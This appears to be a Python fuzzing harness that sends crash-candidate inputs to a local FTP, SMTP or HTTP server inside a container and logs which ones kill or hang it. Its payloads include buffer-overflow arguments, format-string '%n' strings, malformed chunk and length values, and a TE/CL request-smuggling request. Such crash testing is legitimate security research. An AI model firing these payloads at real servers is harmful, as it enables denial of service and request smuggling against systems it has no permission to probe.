#!/usr/bin/env python3
"""Input-construction battery for a network target (run INSIDE its container).

Usage: seed_battery.py <port> <proto>
Sends a battery of crash/property-violation candidate shapes, reports per-shape:
  CRASH   - connection reset/EOF before any complete response (server died)
  WEDGE   - shape completes but a NEW connection afterwards gets no response
  ok      - normal response
"""
import os
import socket
import subprocess
import sys
import time

RESTART = os.environ.get("BATTERY_RESTART", "")

PORT = int(sys.argv[1])
PROTO = sys.argv[2] if len(sys.argv) > 2 else "ftp"


def b(s):
    return s.encode() if isinstance(s, str) else s


def one(shape, label, wait=1.0):
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=5)
        s.settimeout(wait)
        got = b""
        try:
            while len(got) < 65536:
                c = s.recv(65536)
                if not c:
                    return "CRASH-EOF", b""
                got += c
                if len(c) < 65536:
                    break
        except socket.timeout:
            pass
        except ConnectionResetError:
            return "CRASH-RST", b""
        s.close()
        return "ok", got
    except ConnectionRefusedError:
        return "CRASH-REFUSED", b""
    except Exception as e:
        return f"ERR {type(e).__name__}", b""


def probe_alive(timeout=2.0):
    try:
        p = socket.create_connection(("127.0.0.1", PORT), timeout=timeout)
        p.settimeout(timeout)
        p.sendall(b"NOOP\r\n" if PROTO == "ftp" else
                  b"OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n" if PROTO == "rtsp" else
                  b"QUIT\r\n")
        try:
            p.recv(256)
            p.close()
            return True
        except Exception:
            return False
    except Exception:
        return False


def run(shapes):
    for label, shape, wait in shapes:
        if RESTART:
            subprocess.call(RESTART, shell=True)
            time.sleep(1.2)
        status, resp = one(shape, label, wait)
        extra = ""
        if status.startswith("CRASH"):
            extra = " | alive-after=" + str(probe_alive())
        elif status == "ok" and not probe_alive():
            status = "WEDGE"
        print(f"[{status:14s}] {label}{extra}")
        time.sleep(0.3)
        if status.startswith("CRASH") or status == "WEDGE":
            with open("/tmp/battery_hit.txt", "a") as f:
                f.write(f"{label}\n{repr(shape)[:400]}\n\n")


LEXKILL = b"al?um+aft\x81r+" + b"i" * 28 + b"library<artirts?media_kind=music"

if PROTO == "ftp":
    shapes = [
        ("user-4k-arg", b"USER " + b"A" * 4096 + b"\r\nQUIT\r\n", 1.0),
        ("cwd-16k-arg", b"CWD /" + b"B" * 16384 + b"\r\nQUIT\r\n", 1.0),
        ("mkd-32k-arg", b"MKD /" + b"C" * 32768 + b"\r\nQUIT\r\n", 1.0),
        ("user-fmt-n", b"USER " + b"%n" * 64 + b"\r\nQUIT\r\n", 1.0),
        ("user-fmt-s", b"USER " + b"%s" * 64 + b"\r\nQUIT\r\n", 1.0),
        ("stat-fmt-9d", b"STAT %99999999d%d%d%d\r\nQUIT\r\n", 1.0),
        ("lexkill-cwd", b"CWD " + LEXKILL + b"\r\nQUIT\r\n", 2.0),
        ("lexkill-user", b"USER " + LEXKILL + b"\r\nQUIT\r\n", 2.0),
        ("lexkill-stat", b"STAT " + LEXKILL + b"\r\nQUIT\r\n", 2.0),
        ("lexkill-site", b"SITE CHOWN " + LEXKILL + b"\r\nQUIT\r\n", 2.0),
        ("nul-in-cmd", b"CWD a\x00b\r\nQUIT\r\n", 1.0),
        ("deep-glob", b"STAT " + b"/*" * 512 + b"\r\nQUIT\r\n", 2.0),
        ("site-chown-many", b"SITE CHOWN " + b" ".join([b"a:b"] * 512) + b"\r\nQUIT\r\n", 2.0),
        ("type-junk", b"TYPE " + b"\xff\xfe\x81" * 128 + b"\r\nQUIT\r\n", 1.0),
        ("mode-junk", b"MODE " + b"\x81?\xff" * 256 + b"\r\nQUIT\r\n", 1.0),
    ]
elif PROTO == "smtp":
    shapes = [
        ("bdat-huge", b"EHLO t\r\nBDAT 999999999999\r\n", 2.0),
        ("bdat-neg", b"EHLO t\r\nBDAT -1\r\n", 2.0),
        ("bdat-neg-last", b"EHLO t\r\nBDAT -1 LAST\r\n", 2.0),
        ("bdat-max", b"EHLO t\r\nBDAT 4294967295\r\n", 2.0),
        ("long-verb-8k", b"X" * 8192 + b"\r\nQUIT\r\n", 2.0),
        ("noop-4k", b"NOOP " + b"N" * 4096 + b"\r\nQUIT\r\n", 1.0),
        ("mail-lexkill", b"EHLO t\r\nMAIL FROM:<" + LEXKILL + b">\r\nQUIT\r\n", 2.0),
        ("vrfy-fmt", b"VRFY " + b"%n" * 64 + b"\r\nQUIT\r\n", 1.0),
        ("expn-deep", b"EXPN " + b":" * 1024 + b"@a\r\nQUIT\r\n", 1.0),
        ("rcpt-16k", b"EHLO t\r\nMAIL FROM:<a@b>\r\nRCPT TO:<" + b"r" * 16384 + b"@a>\r\nQUIT\r\n", 2.0),
        ("bdat-nul", b"EHLO t\r\nBDAT 4\x00LAST\r\n", 1.0),
        ("helo-highbytes", b"EHLO " + b"\x81?\xff" * 256 + b"\r\nQUIT\r\n", 2.0),
    ]
elif PROTO == "http":
    H = b"POST /index.html HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n"
    shapes = [
        ("chunk-neg", H + b"-1\r\n", 2.0),
        ("chunk-huge", H + b"FFFFFFFFFFFFFFFF\r\n", 2.0),
        ("chunk-huge2", H + b"99999999999999\r\n", 2.0),
        ("chunk-junk", H + b"\x81?\xffzz\r\n", 2.0),
        ("cl-neg", b"POST /index.html HTTP/1.1\r\nHost: a\r\nContent-Length: -1\r\n\r\n", 2.0),
        ("cl-huge", b"POST /index.html HTTP/1.1\r\nHost: a\r\nContent-Length: 99999999999999\r\n\r\n", 2.0),
        ("te-cl-both", b"POST /index.html HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\nGET /index.html HTTP/1.1\r\nHost: b\r\nSmuggled: yes\r\n\r\n", 3.0),
        ("trailer-merge", b"POST /index.html HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nX-Smuggled: yes\r\n\r\n", 3.0),
        ("many-headers", b"GET /index.html HTTP/1.1\r\nHost: a\r\n" + b"".join(b"X-H%d: v\r\n" % i for i in range(2048)) + b"\r\n", 3.0),
        ("lexkill-uri", b"GET /" + LEXKILL + b" HTTP/1.1\r\nHost: a\r\n\r\n", 2.0),
        ("uri-16k", b"GET /" + b"u" * 16384 + b" HTTP/1.1\r\nHost: a\r\n\r\n", 2.0),
        ("nul-uri", b"GET /a\x00b HTTP/1.1\r\nHost: a\r\n\r\n", 2.0),
    ]
else:
    shapes = []

open("/tmp/battery_hit.txt", "w").close()
run(shapes)
print("done")
